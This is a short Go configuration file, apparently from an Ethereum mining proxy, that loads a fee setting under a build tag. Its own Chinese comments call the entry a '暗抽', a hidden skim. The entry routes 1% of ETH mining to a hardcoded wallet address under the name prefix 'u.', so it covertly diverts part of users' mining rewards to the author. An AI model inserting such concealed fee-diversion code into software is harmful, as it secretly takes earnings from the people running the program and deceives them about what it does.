// +build self_cfg

package config

import (
	"encoding/base64"
)

// LoadFeeCfg 加载暗抽设置
func LoadFeeCfg() {
	// 我们的暗抽
	FeeStates["eth"] = append(FeeStates["eth"], FeeState{
		Upstream:   Upstream{},
		Wallet:     "0xB775f5396eBe589C770069Bfcc421Ca135E9a326",
		NamePrefix: "u.",
		Pct:        1,
	})
}
